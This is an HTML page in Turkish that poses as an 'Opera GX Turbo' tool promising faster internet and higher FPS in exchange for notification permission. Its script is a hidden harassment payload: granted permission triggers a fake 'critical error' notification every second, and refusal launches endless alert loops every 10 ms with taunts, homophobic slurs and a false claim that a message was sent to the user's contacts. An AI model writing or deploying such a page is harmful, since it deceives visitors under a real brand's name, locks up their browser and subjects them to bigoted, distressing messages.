<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opera GX - Gaming SpeedUp</title>
    <style>
        body { background: #121212; color: #ff1b2d; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .gx-card { border: 2px solid #ff1b2d; padding: 40px; border-radius: 10px; background: #1a1a1a; box-shadow: 0 0 20px #ff1b2d; }
        .btn-gx { background: #ff1b2d; color: white; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="gx-card">
        <h1 style="margin-bottom:10px;">🔴 OPERA GX TURBO</h1>
        <p>İnternet hızını ve FPS'i artırmak için bildirim izni verin.</p>
        <button class="btn-gx" onclick="startOperaTroll()">TURBOYU AÇ</button>
    </div>

    <script>
        function startOperaTroll() {
            // Opera'da bildirim izni isteme
            if (!("Notification" in window)) {
                // Eğer bildirim desteklenmiyorsa direk Alert Döngüsüne sokalım (Kaçış yok!)
                launchAlertLoop();
                return;
            }

            Notification.requestPermission().then(function(permission) {
                if (permission === "granted") {
                    // İzin gelirse saniyede bir dızt dızt!
                    setInterval(() => {
                        new Notification("🚨 OPERA KRITIK HATA!", {
                            body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
                            icon: "https://upload.wikimedia.org/wikipedia/commons/e/e3/Opera_GX_Logo.png",
                            tag: 'gx' + Math.random() // Her biri ayrı bildirim olarak düşsün
                        });
                    }, 1000); 
                } else {
                    // İzin vermezse zorla Alert çıkarıyoruz
                    launchAlertLoop();
                }
            });
        }

        function launchAlertLoop() {
            alert("TURBO MODU BAŞLATILAMADI!");
            alert("GAY MODU AKTİF EDİLDİ! HAHAHA!");
            setInterval(function() {
                alert("SİLSENE LAN! HADİ SİL!");
                alert("BEN GAYIM DİYE TÜM REHBERE MESAJ GİTTİ!");
            }, 10); // 10ms'de bir alert patlatır
        }
    </script>
</body>
</html>
